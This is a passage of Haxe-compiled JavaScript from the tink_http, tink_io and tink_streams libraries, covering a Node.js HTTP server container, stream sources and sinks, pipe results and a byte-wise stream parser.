		var this1 = tink_http_IncomingRequestHeader.fromIncomingMessage(req);
		var options = null;
		if(options == null) {
			options = { };
		}
		handler1.process(new tink_http_IncomingRequest(req1,this1,tink_http_IncomingRequestBody.Plain(tink_io_nodejs_NodejsSource.wrap("Incoming HTTP message from " + req.socket.remoteAddress,socket,options.chunkSize,options.onEnd)))).handle(function(out) {
			tink_io_Source.pipeTo(out.body.prepend(new tink_streams_Single(new tink_core__$Lazy_LazyConst(tink_chunk_ByteChunk.of(haxe_io_Bytes.ofString(out.header.toString()))))),tink_io_nodejs_NodejsSink.wrap("Outgoing HTTP response to " + req.socket.remoteAddress,socket)).handle(function(_) {
				socket.end();
			});
		});
	};
};
tink_http_containers_NodeContainer.prototype = {
	run: function(handler) {
		var _gthis = this;
		return tink_core_Future.async(function(cb) {
			var failures = tink_core_Signal.trigger();
			var server;
			var _g = _gthis.kind;
			switch(_g._hx_index) {
			case 0:
				var server1 = _g.server;
				server = server1;
				break;
			case 1:
				var port = _g.port;
				var server1 = new js_node_http_Server();
				server1.listen(port);
				server = server1;
				break;
			case 2:
				var host = _g.host;
				var server1 = new js_node_http_Server();
				server1.listen(tink_url_Host.get_port(host),tink_url_Host.get_name(host));
				server = server1;
				break;
			case 3:
				var path = _g.path;
				var server1 = new js_node_http_Server();
				server1.listen(path);
				server = server1;
				break;
			case 4:
				var fd = _g.fd;
				var server1 = new js_node_http_Server();
				server1.listen(fd);
				server = server1;
				break;
			}
			var tinkify = function(e) {
				return tink_core_TypedError.withData(null,e.message,e,{ fileName : "tink/http/containers/NodeContainer.hx", lineNumber : 69, className : "tink.http.containers.NodeContainer", methodName : "run"});
			};
			server.on("error",function(e) {
				cb(tink_http_ContainerResult.Failed(e));
			});
			if(_gthis.upgradable) {
				server.on("upgrade",tink_http_containers_NodeContainer.toUpgradeHandler(handler));
			}
			var onListen = function() {
				var onListen = tink_http_ContainerResult.Running({ shutdown : function(hard) {
					if(hard) {
						console.log("tink/http/containers/NodeContainer.hx:82:","Warning: hard shutdown not implemented");
					}
					return tink_core_Future.map(tink_core_Future.async(function(cb) {
						server.close(function() {
							cb(true);
						});
					}),tink_core_Outcome.Success);
				}, failures : failures});
				cb(onListen);
			};
			if(server.listening) {
				onListen();
			} else {
				server.on("listening",onListen);
			}
			server.on("request",tink_http_Handler.toNodeHandler(handler));
			server.on("error",function(e) {
				cb(tink_http_ContainerResult.Failed(e));
			});
		});
	}
	,__class__: tink_http_containers_NodeContainer
};
var tink_http_containers__$NodeContainer_ServerKindBase = $hxEnums["tink.http.containers._NodeContainer.ServerKindBase"] = { __ename__:true,__constructs__:null
	,Instance: ($_=function(server) { return {_hx_index:0,server:server,__enum__:"tink.http.containers._NodeContainer.ServerKindBase",toString:$estr}; },$_._hx_name="Instance",$_.__params__ = ["server"],$_)
	,Port: ($_=function(port) { return {_hx_index:1,port:port,__enum__:"tink.http.containers._NodeContainer.ServerKindBase",toString:$estr}; },$_._hx_name="Port",$_.__params__ = ["port"],$_)
	,Host: ($_=function(host) { return {_hx_index:2,host:host,__enum__:"tink.http.containers._NodeContainer.ServerKindBase",toString:$estr}; },$_._hx_name="Host",$_.__params__ = ["host"],$_)
	,Path: ($_=function(path) { return {_hx_index:3,path:path,__enum__:"tink.http.containers._NodeContainer.ServerKindBase",toString:$estr}; },$_._hx_name="Path",$_.__params__ = ["path"],$_)
	,Fd: ($_=function(fd) { return {_hx_index:4,fd:fd,__enum__:"tink.http.containers._NodeContainer.ServerKindBase",toString:$estr}; },$_._hx_name="Fd",$_.__params__ = ["fd"],$_)
};
tink_http_containers__$NodeContainer_ServerKindBase.__constructs__ = [tink_http_containers__$NodeContainer_ServerKindBase.Instance,tink_http_containers__$NodeContainer_ServerKindBase.Port,tink_http_containers__$NodeContainer_ServerKindBase.Host,tink_http_containers__$NodeContainer_ServerKindBase.Path,tink_http_containers__$NodeContainer_ServerKindBase.Fd];
var tink_http_containers_ServerKind = {};
tink_http_containers_ServerKind.fromInstance = function(server) {
	return tink_http_containers__$NodeContainer_ServerKindBase.Instance(server);
};
tink_http_containers_ServerKind.fromPort = function(port) {
	return tink_http_containers__$NodeContainer_ServerKindBase.Port(port);
};
tink_http_containers_ServerKind.fromHost = function(host) {
	return tink_http_containers__$NodeContainer_ServerKindBase.Host(host);
};
tink_http_containers_ServerKind.fromPath = function(path) {
	return tink_http_containers__$NodeContainer_ServerKindBase.Path(path);
};
tink_http_containers_ServerKind.fromFd = function(fd) {
	return tink_http_containers__$NodeContainer_ServerKindBase.Fd(fd);
};
var tink_io_PipeOptions = {};
tink_io_PipeOptions.get_end = function(this1) {
	if(this1 != null) {
		return this1.end;
	} else {
		return false;
	}
};
tink_io_PipeOptions.get_destructive = function(this1) {
	if(this1 != null) {
		return this1.destructive;
	} else {
		return false;
	}
};
var tink_io_PipeResult = $hxEnums["tink.io.PipeResult"] = { __ename__:true,__constructs__:null
	,AllWritten: {_hx_name:"AllWritten",_hx_index:0,__enum__:"tink.io.PipeResult",toString:$estr}
	,SinkEnded: ($_=function(result,rest) { return {_hx_index:1,result:result,rest:rest,__enum__:"tink.io.PipeResult",toString:$estr}; },$_._hx_name="SinkEnded",$_.__params__ = ["result","rest"],$_)
	,SinkFailed: ($_=function(e,rest) { return {_hx_index:2,e:e,rest:rest,__enum__:"tink.io.PipeResult",toString:$estr}; },$_._hx_name="SinkFailed",$_.__params__ = ["e","rest"],$_)
	,SourceFailed: ($_=function(e) { return {_hx_index:3,e:e,__enum__:"tink.io.PipeResult",toString:$estr}; },$_._hx_name="SourceFailed",$_.__params__ = ["e"],$_)
};
tink_io_PipeResult.__constructs__ = [tink_io_PipeResult.AllWritten,tink_io_PipeResult.SinkEnded,tink_io_PipeResult.SinkFailed,tink_io_PipeResult.SourceFailed];
var tink_io_PipeResultTools = function() { };
tink_io_PipeResultTools.__name__ = true;
tink_io_PipeResultTools.toOutcome = function(result) {
	switch(result._hx_index) {
	case 0:
		return tink_core_Outcome.Success(haxe_ds_Option.None);
	case 1:
		var _g = result.rest;
		var result1 = result.result;
		return tink_core_Outcome.Success(haxe_ds_Option.Some(result1));
	case 2:
		var _g = result.rest;
		var e = result.e;
		return tink_core_Outcome.Failure(e);
	case 3:
		var e = result.e;
		return tink_core_Outcome.Failure(e);
	}
};
tink_io_PipeResultTools.toResult = function(c,result,buffered) {
	var mk = function(s) {
		if(buffered == null) {
			return s;
		} else {
			var v = buffered;
			return s.prepend(new tink_streams_Single(new tink_core__$Lazy_LazyConst(v)));
		}
	};
	switch(c._hx_index) {
	case 0:
		var rest = c.rest;
		return tink_io_PipeResult.SinkEnded(result,mk(rest));
	case 1:
		var e = c.error;
		var rest = c.at;
		return tink_io_PipeResult.SinkFailed(e,mk(rest));
	case 2:
		var e = c.error;
		return tink_io_PipeResult.SourceFailed(e);
	case 3:
		return tink_io_PipeResult.AllWritten;
	}
};
var tink_io_SinkObject = function() { };
tink_io_SinkObject.__name__ = true;
tink_io_SinkObject.__isInterface__ = true;
tink_io_SinkObject.prototype = {
	__class__: tink_io_SinkObject
};
var tink_io_SinkBase = function() { };
tink_io_SinkBase.__name__ = true;
tink_io_SinkBase.__interfaces__ = [tink_io_SinkObject];
tink_io_SinkBase.prototype = {
	get_sealed: function() {
		return true;
	}
	,consume: function(source,options) {
		throw haxe_Exception.thrown("not implemented");
	}
	,__class__: tink_io_SinkBase
};
var tink_io__$Sink_Blackhole = function() {
};
tink_io__$Sink_Blackhole.__name__ = true;
tink_io__$Sink_Blackhole.__super__ = tink_io_SinkBase;
tink_io__$Sink_Blackhole.prototype = $extend(tink_io_SinkBase.prototype,{
	consume: function(source,options) {
		return tink_core_Future.map(source.forEach(tink_streams_Handler.ofSafe(function(_) {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Handled.Resume));
		})),function(o) {
			switch(o._hx_index) {
			case 0:
				var _g = o.rest;
				throw haxe_Exception.thrown("unreachable");
			case 2:
				var e = o.error;
				return tink_io_PipeResult.SourceFailed(e);
			case 3:
				return tink_io_PipeResult.AllWritten;
			}
		});
	}
	,__class__: tink_io__$Sink_Blackhole
});
var tink_io_SinkYielding = {};
tink_io_SinkYielding.end = function(this1) {
	if(this1.get_sealed()) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(false)));
	} else {
		return tink_core_Future.map(this1.consume(tink_io_Source.EMPTY,{ end : true}),function(r) {
			switch(r._hx_index) {
			case 0:
				return tink_core_Outcome.Success(true);
			case 1:
				var _g = r.result;
				var _g = r.rest;
				return tink_core_Outcome.Success(true);
			case 2:
				var _g = r.rest;
				var e = r.e;
				return tink_core_Outcome.Failure(e);
			}
		});
	}
};
tink_io_SinkYielding.dirty = function(this1) {
	return this1;
};
tink_io_SinkYielding.ofError = function(e) {
	return new tink_io__$Sink_ErrorSink(e);
};
tink_io_SinkYielding.ofPromised = function(p) {
	return new tink_io__$Sink_FutureSink(tink_core_Future.map(p,function(o) {
		switch(o._hx_index) {
		case 0:
			var v = o.data;
			return v;
		case 1:
			var e = o.failure;
			return tink_io_SinkYielding.ofError(e);
		}
	}));
};
tink_io_SinkYielding.ofNodeStream = function(name,r) {
	return tink_io_nodejs_NodejsSink.wrap(name,r);
};
tink_io_SinkYielding.ofOutput = function(name,target,options) {
	var tmp;
	if(options == null) {
		tmp = tink_io_Worker.get();
	} else {
		var _g = options.worker;
		if(_g == null) {
			tmp = tink_io_Worker.get();
		} else {
			var w = _g;
			tmp = w;
		}
	}
	return new tink_io_std_OutputSink(name,target,tmp);
};
var tink_io__$Sink_FutureSink = function(f) {
	this.f = f;
};
tink_io__$Sink_FutureSink.__name__ = true;
tink_io__$Sink_FutureSink.__super__ = tink_io_SinkBase;
tink_io__$Sink_FutureSink.prototype = $extend(tink_io_SinkBase.prototype,{
	consume: function(source,options) {
		return tink_core_Future.flatMap(this.f,function(sink) {
			return sink.consume(source,options);
		});
	}
	,__class__: tink_io__$Sink_FutureSink
});
var tink_io__$Sink_ErrorSink = function(error) {
	this.error = error;
};
tink_io__$Sink_ErrorSink.__name__ = true;
tink_io__$Sink_ErrorSink.__super__ = tink_io_SinkBase;
tink_io__$Sink_ErrorSink.prototype = $extend(tink_io_SinkBase.prototype,{
	get_sealed: function() {
		return false;
	}
	,consume: function(source,options) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_io_PipeResult.SinkFailed(this.error,source)));
	}
	,__class__: tink_io__$Sink_ErrorSink
});
var tink_streams_StreamObject = function() { };
tink_streams_StreamObject.__name__ = true;
tink_streams_StreamObject.__isInterface__ = true;
tink_streams_StreamObject.prototype = {
	__class__: tink_streams_StreamObject
};
var tink_streams_StreamBase = function() {
	this.retainCount = 0;
};
tink_streams_StreamBase.__name__ = true;
tink_streams_StreamBase.__interfaces__ = [tink_streams_StreamObject];
tink_streams_StreamBase.prototype = {
	get_depleted: function() {
		return false;
	}
	,retain: function() {
		var _gthis = this;
		this.retainCount++;
		var retained = true;
		return function() {
			if(retained) {
				retained = false;
				if(--_gthis.retainCount == 0) {
					_gthis.destroy();
				}
			}
		};
	}
	,next: function() {
		throw haxe_Exception.thrown("not implemented");
	}
	,regroup: function(f) {
		return new tink_streams__$Stream_RegroupStream(this,f);
	}
	,map: function(f) {
		return this.regroup(f);
	}
	,filter: function(f) {
		return this.regroup(f);
	}
	,destroy: function() {
	}
	,append: function(other) {
		if(this.get_depleted()) {
			return other;
		} else {
			return tink_streams__$Stream_CompoundStream.of([this,other]);
		}
	}
	,prepend: function(other) {
		if(this.get_depleted()) {
			return other;
		} else {
			return tink_streams__$Stream_CompoundStream.of([other,this]);
		}
	}
	,blend: function(other) {
		if(this.get_depleted()) {
			return other;
		} else {
			return new tink_streams_BlendStream(this,other);
		}
	}
	,decompose: function(into) {
		if(!this.get_depleted()) {
			into.push(this);
		}
	}
	,idealize: function(rescue) {
		if(this.get_depleted()) {
			return tink_streams_Empty.inst;
		} else {
			return new tink_streams_IdealizeStream(this,rescue);
		}
	}
	,reduce: function(initial,reducer) {
		var _gthis = this;
		return tink_core_Future.async(function(cb) {
			_gthis.forEach(tink_streams_Handler.ofUnknown(function(item) {
				return tink_core_Future.map(reducer(initial,item),function(o) {
					switch(o._hx_index) {
					case 0:
						var v = o.result;
						initial = v;
						return tink_streams_Handled.Resume;
					case 1:
						var e = o.e;
						return tink_streams_Handled.Clog(e);
					}
				});
			})).handle(function(c) {
				switch(c._hx_index) {
				case 0:
					var _g = c.rest;
					throw haxe_Exception.thrown("assert");
				case 1:
					var e = c.error;
					var rest = c.at;
					cb(tink_streams_Reduction.Crashed(e,rest));
					break;
				case 2:
					var e = c.error;
					cb(tink_streams_Reduction.Failed(e));
					break;
				case 3:
					cb(tink_streams_Reduction.Reduced(initial));
					break;
				}
			});
		});
	}
	,forEach: function(handler) {
		throw haxe_Exception.thrown("not implemented");
	}
	,__class__: tink_streams_StreamBase
};
var tink_streams_Empty = function() {
	tink_streams_StreamBase.call(this);
};
tink_streams_Empty.__name__ = true;
tink_streams_Empty.make = function() {
	return tink_streams_Empty.inst;
};
tink_streams_Empty.__super__ = tink_streams_StreamBase;
tink_streams_Empty.prototype = $extend(tink_streams_StreamBase.prototype,{
	get_depleted: function() {
		return true;
	}
	,next: function() {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Step.End));
	}
	,forEach: function(handler) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Conclusion.Depleted));
	}
	,__class__: tink_streams_Empty
});
var tink_io_Source = {};
tink_io_Source.dirty = function(this1) {
	return this1;
};
tink_io_Source.get_depleted = function(this1) {
	return this1.get_depleted();
};
tink_io_Source.ofNodeStream = function(name,r,options) {
	if(options == null) {
		options = { };
	}
	return tink_io_nodejs_NodejsSource.wrap(name,r,options.chunkSize,options.onEnd);
};
tink_io_Source.toNodeStream = function(this1) {
	var native = new js_node_stream_PassThrough();
	var source = tink_io_Source.chunked(this1);
	var write = null;
	write = function() {
		source.forEach(tink_streams_Handler.ofSafe(function(chunk) {
			var native1 = native;
			var b = chunk.toBytes();
			var data = b.b;
			var ok = native1.write(js_node_buffer_Buffer.from(data.buffer,data.byteOffset,b.length));
			if(ok) {
				return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Handled.Resume));
			} else {
				return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Handled.Finish));
			}
		})).handle(function(o) {
			switch(o._hx_index) {
			case 0:
				var rest = o.rest;
				source = rest;
				break;
			case 2:
				var e = o.error;
				native.emit("error",new Error(e.message));
				break;
			case 3:
				native.removeListener("drain",write);
				native.end();
				break;
			}
		});
	};
	var f = write;
	var time_ms = 1;
	var tmp = function() {
		return haxe_Timer.delay(f,time_ms);
	};
	native.on("drain",tmp);
	write();
	return native;
};
tink_io_Source.ofJsFile = function(name,file,options) {
	var chunkSize = options == null || options.chunkSize == null ? 16777216 : options.chunkSize;
	return new tink_io_js_BlobSource(name,file,0,chunkSize);
};
tink_io_Source.ofJsBlob = function(name,blob,options) {
	var chunkSize = options == null || options.chunkSize == null ? 16777216 : options.chunkSize;
	return new tink_io_js_BlobSource(name,blob,0,chunkSize);
};
tink_io_Source.ofInput = function(name,input,options) {
	if(options == null) {
		options = { };
	}
	var tmp = tink_io_Worker.ensure(options.worker);
	var length;
	var _g = options.chunkSize;
	if(_g == null) {
		length = 65536;
	} else {
		var v = _g;
		length = v;
	}
	return new tink_io_std_InputSource(name,input,tmp,new haxe_io_Bytes(new ArrayBuffer(length)),0);
};
tink_io_Source.chunked = function(this1) {
	return this1;
};
tink_io_Source.concatAll = function(s) {
	return s.reduce(tink_Chunk.EMPTY,tink_streams_Reducer.ofSafe(function(res,cur) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_ReductionStep.Progress(tink_Chunk.concat(res,cur))));
	}));
};
tink_io_Source.pipeTo = function(this1,target,options) {
	return target.consume(this1,options);
};
tink_io_Source.append = function(this1,that) {
	return this1.append(that);
};
tink_io_Source.prepend = function(this1,that) {
	return this1.prepend(that);
};
tink_io_Source.transform = function(this1,transformer) {
	return transformer.transform(this1);
};
tink_io_Source.skip = function(this1,len) {
	return this1.regroup(tink_streams_Regrouper.ofIgnoranceSync(function(chunks) {
		var chunk = chunks[0];
		if(len <= 0) {
			return tink_streams_RegroupResult.Converted(tink_streams_Stream.single(chunk));
		}
		var length = chunk.getLength();
		var out = tink_streams_RegroupResult.Converted(len < length ? tink_streams_Stream.single(chunk.slice(len,length)) : tink_streams_Empty.inst);
		len -= length;
		return out;
	}));
};
tink_io_Source.limit = function(this1,len) {
	if(len == 0) {
		return tink_io_Source.EMPTY;
	}
	return this1.regroup(tink_streams_Regrouper.ofIgnoranceSync(function(chunks) {
		if(len <= 0) {
			return tink_streams_RegroupResult.Terminated(haxe_ds_Option.None);
		}
		var chunk = chunks[0];
		var length = chunk.getLength();
		var out = len == length ? tink_streams_RegroupResult.Terminated(haxe_ds_Option.Some(tink_streams_Stream.single(chunk))) : tink_streams_RegroupResult.Converted(tink_streams_Stream.single(len < length ? chunk.slice(0,len) : chunk));
		len -= length;
		return out;
	}));
};
tink_io_Source.ofError = function(e) {
	return tink_streams_Stream.ofError(e);
};
tink_io_Source.ofFuture = function(f) {
	return tink_streams_Stream.future(f);
};
tink_io_Source.ofPromised = function(p) {
	return tink_streams_Stream.future(tink_core_Future.map(p,function(o) {
		switch(o._hx_index) {
		case 0:
			var s = o.data;
			return s;
		case 1:
			var e = o.failure;
			return tink_io_Source.ofError(e);
		}
	}));
};
tink_io_Source.ofChunk = function(chunk) {
	return new tink_streams_Single(new tink_core__$Lazy_LazyConst(chunk));
};
tink_io_Source.ofString = function(s) {
	return new tink_streams_Single(new tink_core__$Lazy_LazyConst(tink_chunk_ByteChunk.of(haxe_io_Bytes.ofString(s))));
};
tink_io_Source.ofBytes = function(b) {
	return new tink_streams_Single(new tink_core__$Lazy_LazyConst(tink_chunk_ByteChunk.of(b)));
};
tink_io_Source.ofFutureChunk = function(chunk) {
	return tink_io_Source.ofFuture(tink_core_Future.map(chunk,tink_io_Source.ofChunk));
};
tink_io_Source.ofFutureString = function(s) {
	return tink_io_Source.ofFuture(tink_core_Future.map(s,tink_io_Source.ofString));
};
tink_io_Source.ofFutureBytes = function(b) {
	return tink_io_Source.ofFuture(tink_core_Future.map(b,tink_io_Source.ofBytes));
};
tink_io_Source.ofPromiseChunk = function(chunk) {
	return tink_io_Source.ofPromised(tink_core_Promise.next(chunk,tink_core_Next.ofSafeSync(tink_io_Source.ofChunk)));
};
tink_io_Source.ofPromiseString = function(s) {
	return tink_io_Source.ofPromised(tink_core_Promise.next(s,tink_core_Next.ofSafeSync(tink_io_Source.ofString)));
};
tink_io_Source.ofPromiseBytes = function(b) {
	return tink_io_Source.ofPromised(tink_core_Promise.next(b,tink_core_Next.ofSafeSync(tink_io_Source.ofBytes)));
};
var tink_io_RealSourceTools = function() { };
tink_io_RealSourceTools.__name__ = true;
tink_io_RealSourceTools.all = function(s) {
	return tink_core_Future.map(tink_io_Source.concatAll(s),function(o) {
		switch(o._hx_index) {
		case 1:
			var e = o.error;
			return tink_core_Outcome.Failure(e);
		case 2:
			var c = o.result;
			return tink_core_Outcome.Success(c);
		}
	});
};
tink_io_RealSourceTools.parse = function(s,p) {
	return tink_core_Future.map(tink_io_StreamParser.parse(s,p),function(r) {
		switch(r._hx_index) {
		case 0:
			var data = r.data;
			var rest = r.rest;
			var this1 = new tink_core_MPair(data,rest);
			return tink_core_Outcome.Success(this1);
		case 1:
			var _g = r.rest;
			var e = r.e;
			return tink_core_Outcome.Failure(e);
		case 2:
			var e = r.e;
			return tink_core_Outcome.Failure(e);
		}
	});
};
tink_io_RealSourceTools.split = function(src,delim) {
	var s = tink_io_RealSourceTools.parse(src,new tink_io_Splitter(delim));
	return { before : tink_streams_Stream.promise(tink_core_Promise.next(s,tink_core_Next.ofSafeSync(function(p) {
		var _g = p.a;
		switch(_g._hx_index) {
		case 0:
			var chunk = _g.v;
			return new tink_streams_Single(new tink_core__$Lazy_LazyConst(chunk));
		case 1:
			return src;
		}
	}))), delimiter : tink_core_Promise.next(s,function(p) {
		var _g = p.a;
		switch(_g._hx_index) {
		case 0:
			var _g1 = _g.v;
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Success(delim)));
		case 1:
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Failure(new tink_core_TypedError(404,"Delimiter not found",{ fileName : "tink/io/Source.hx", lineNumber : 213, className : "tink.io.RealSourceTools", methodName : "split"}))));
		}
	}), after : tink_streams_Stream.promise(tink_core_Promise.next(s,tink_core_Next.ofSafeSync(function(p) {
		return p.b;
	})))};
};
tink_io_RealSourceTools.parseStream = function(s,p) {
	return tink_io_StreamParser.parseStream(s,p);
};
tink_io_RealSourceTools.idealize = function(s,rescue) {
	return tink_io_Source.chunked(s).idealize(rescue);
};
var tink_io_IdealSourceTools = function() { };
tink_io_IdealSourceTools.__name__ = true;
tink_io_IdealSourceTools.all = function(s) {
	return tink_core_Future.map(tink_io_Source.concatAll(s),function(o) {
		var c = o.result;
		return c;
	});
};
tink_io_IdealSourceTools.parse = function(s,p) {
	return tink_core_Future.map(tink_io_StreamParser.parse(s,p),function(r) {
		switch(r._hx_index) {
		case 0:
			var data = r.data;
			var rest = r.rest;
			var this1 = new tink_core_MPair(data,rest);
			return tink_core_Outcome.Success(this1);
		case 1:
			var _g = r.rest;
			var e = r.e;
			return tink_core_Outcome.Failure(e);
		}
	});
};
tink_io_IdealSourceTools.parseStream = function(s,p) {
	return tink_io_StreamParser.parseStream(s,p);
};
tink_io_IdealSourceTools.split = function(s,delim) {
	var s1 = tink_io_RealSourceTools.split(s,delim);
	return { before : tink_io_RealSourceTools.idealize(s1.before,function(e) {
		return tink_io_Source.EMPTY;
	}), delimiter : s1.delimiter, after : tink_io_RealSourceTools.idealize(s1.after,function(e) {
		return tink_io_Source.EMPTY;
	})};
};
var tink_io_ParseResult = $hxEnums["tink.io.ParseResult"] = { __ename__:true,__constructs__:null
	,Parsed: ($_=function(data,rest) { return {_hx_index:0,data:data,rest:rest,__enum__:"tink.io.ParseResult",toString:$estr}; },$_._hx_name="Parsed",$_.__params__ = ["data","rest"],$_)
	,Invalid: ($_=function(e,rest) { return {_hx_index:1,e:e,rest:rest,__enum__:"tink.io.ParseResult",toString:$estr}; },$_._hx_name="Invalid",$_.__params__ = ["e","rest"],$_)
	,Broke: ($_=function(e) { return {_hx_index:2,e:e,__enum__:"tink.io.ParseResult",toString:$estr}; },$_._hx_name="Broke",$_.__params__ = ["e"],$_)
};
tink_io_ParseResult.__constructs__ = [tink_io_ParseResult.Parsed,tink_io_ParseResult.Invalid,tink_io_ParseResult.Broke];
var tink_io_StreamParser = {};
tink_io_StreamParser.doParse = function(source,p,consume,finish) {
	var cursor = tink_Chunk.EMPTY.getCursor();
	var resume = true;
	var mk = function(source) {
		if(cursor.currentPos < cursor.length) {
			return source.prepend(new tink_streams_Single(new tink_core__$Lazy_LazyConst(cursor.right())));
		} else {
			return source;
		}
	};
	var flush = function() {
		var _g = cursor.flush();
		var c = _g;
		if(c.getLength() == 0) {
			return tink_io_Source.EMPTY;
		} else {
			var c = _g;
			return new tink_streams_Single(new tink_core__$Lazy_LazyConst(c));
		}
	};
	return tink_core_Future.flatMap(source.forEach(tink_streams_Handler.ofUnknown(function(chunk) {
		if(chunk.getLength() == 0) {
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_streams_Handled.Resume));
		}
		cursor.shift(chunk);
		return tink_core_Future.async(function(cb) {
			var next = null;
			next = function() {
				cursor.shift();
				var lastPos = cursor.currentPos;
				var _g = p.progress(cursor);
				switch(_g._hx_index) {
				case 0:
					if(lastPos != cursor.currentPos && cursor.currentPos < cursor.length) {
						next();
					} else {
						cb(tink_streams_Handled.Resume);
					}
					break;
				case 1:
					var v = _g.r;
					consume(v).handle(function(o) {
						resume = o.resume;
						if(resume) {
							if(lastPos != cursor.currentPos && cursor.currentPos < cursor.length) {
								next();
							} else {
								cb(tink_streams_Handled.Resume);
							}
						} else {
							cb(tink_streams_Handled.Finish);
						}
					});
					break;
				case 2:
					var e = _g.e;
					cb(tink_streams_Handled.Clog(e));
					break;
				}
			};
			next();
		});
	})),function(c) {
		switch(c._hx_index) {
		case 0:
			var rest = c.rest;
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_io_ParseResult.Parsed(finish(),mk(rest))));
		case 1:
			var e = c.error;
			var rest = c.at;
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_io_ParseResult.Invalid(e,mk(rest))));
		case 2:
			var e = c.error;
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_io_ParseResult.Broke(e)));
		case 3:
			if(cursor.currentPos < cursor.length) {
				return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_io_ParseResult.Parsed(finish(),mk(new tink_streams_Single(new tink_core__$Lazy_LazyConst(tink_Chunk.EMPTY))))));
			} else if(!resume) {
				return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_io_ParseResult.Parsed(finish(),flush())));
			} else {
				var _g = p.eof(cursor);
				switch(_g._hx_index) {
				case 0:
					var result = _g.data;
					return tink_core_Future.map(consume(result),function(_) {
						return tink_io_ParseResult.Parsed(finish(),flush());
					});
				case 1:
					var e = _g.failure;
					return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_io_ParseResult.Invalid(e,flush())));
				}
			}
			break;
		}
	});
};
tink_io_StreamParser.parse = function(s,p) {
	var res = null;
	var onResult = function(r) {
		res = r;
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst({ resume : false}));
	};
	return tink_io_StreamParser.doParse(s,p,onResult,function() {
		return res;
	});
};
tink_io_StreamParser.parseStream = function(s,p) {
	var next = null;
	next = function(step) {
		if(s.get_depleted()) {
			step(tink_streams_Step.End);
		} else {
			tink_io_StreamParser.parse(s,p).handle(function(o) {
				switch(o._hx_index) {
				case 0:
					var result = o.data;
					var rest = o.rest;
					s = rest;
					step(tink_streams_Step.Link(result,tink_streams_Generator.stream(next)));
					break;
				case 1:
					var _g = o.rest;
					var e = o.e;
					step(tink_streams_Step.Fail(e));
					break;
				case 2:
					var e = o.e;
					step(tink_streams_Step.Fail(e));
					break;
				}
			});
		}
	};
	return tink_streams_Generator.stream(next);
};
var tink_io_Splitter = function(delim) {
	this.buf = tink_Chunk.EMPTY;
	this.delim = delim;
};
tink_io_Splitter.__name__ = true;
tink_io_Splitter.__super__ = tink_io_BytewiseParser;
tink_io_Splitter.prototype = $extend(tink_io_BytewiseParser.prototype,{
	read: function(char) {
		if(char == -1) {
			return tink_io_ParseStep.Done(haxe_ds_Option.None);
		}
		this.buf = tink_Chunk.concat(this.buf,tink_chunk_ByteChunk.of(haxe_io_Bytes.ofString(String.fromCodePoint(char))));
		if(this.buf.getLength() >= this.delim.getLength()) {
			var bcursor = this.buf.getCursor();
			var delta = this.buf.getLength() - this.delim.getLength();
			bcursor.moveTo(bcursor.currentPos + delta);
			var dcursor = this.delim.getCursor();
			var _g = 0;
			var _g1 = this.delim.getLength();
			while(_g < _g1) {
				var i = _g++;
				if(bcursor.currentByte != dcursor.currentByte) {
					return tink_io_ParseStep.Progressed;
				} else {
					bcursor.next();
					dcursor.next();
				}
			}
			var out = tink_io_ParseStep.Done(haxe_ds_Option.Some(this.buf.slice(0,bcursor.currentPos - this.delim.getLength())));
			this.buf = tink_Chunk.EMPTY;
			return out;
		} else {
			return tink_io_ParseStep.Progressed;
		}
	}
	,__class__: tink_io_Splitter
});
var tink_io_SimpleBytewiseParser = function(f) {
	this._read = f;
};
tink_io_SimpleBytewiseParser.__name__ = true;
tink_io_SimpleBytewiseParser.__super__ = tink_io_BytewiseParser;
tink_io_SimpleBytewiseParser.prototype = $extend(tink_io_BytewiseParser.prototype,{
	read: function(char) {
		return this._read(char);
	}
	,__class__: tink_io_SimpleBytewiseParser
});
var tink_io_WorkerObject = function() { };
tink_io_WorkerObject.__name__ = true;
tink_io_WorkerObject.__isInterface__ = true;
tink_io_WorkerObject.prototype = {
	__class__: tink_io_WorkerObject
};
var tink_io__$Worker_EagerWorker = function() {
};
tink_io__$Worker_EagerWorker.__name__ = true;
tink_io__$Worker_EagerWorker.__interfaces__ = [tink_io_WorkerObject];
tink_io__$Worker_EagerWorker.prototype = {
	work: function(task) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Lazy.get(task)));
	}
	,__class__: tink_io__$Worker_EagerWorker
};
var tink_io_Worker = {};
tink_io_Worker.ensure = function(this1) {
	if(this1 == null) {
		return tink_io_Worker.get();
	} else {
		return this1;
	}
};
tink_io_Worker.get = function() {
	return tink_io_Worker.pool[Std.random(tink_io_Worker.pool.length)];
};
tink_io_Worker.work = function(this1,task) {
	return this1.work(task);
};
var tink_streams_Generator = function(upcoming) {
	tink_streams_StreamBase.call(this);
	this.upcoming = upcoming;
};
tink_streams_Generator.__name__ = true;
tink_streams_Generator.stream = function(step) {
	return new tink_streams_Generator(tink_core_Future.async(step));
};
tink_streams_Generator.__super__ = tink_streams_StreamBase;
tink_streams_Generator.prototype = $extend(tink_streams_StreamBase.prototype,{
	next: function() {
		return this.upcoming;
	}
	,forEach: function(handler) {
		var _gthis = this;
		return tink_core_Future.async(function(cb) {
			_gthis.upcoming.handle(function(e) {
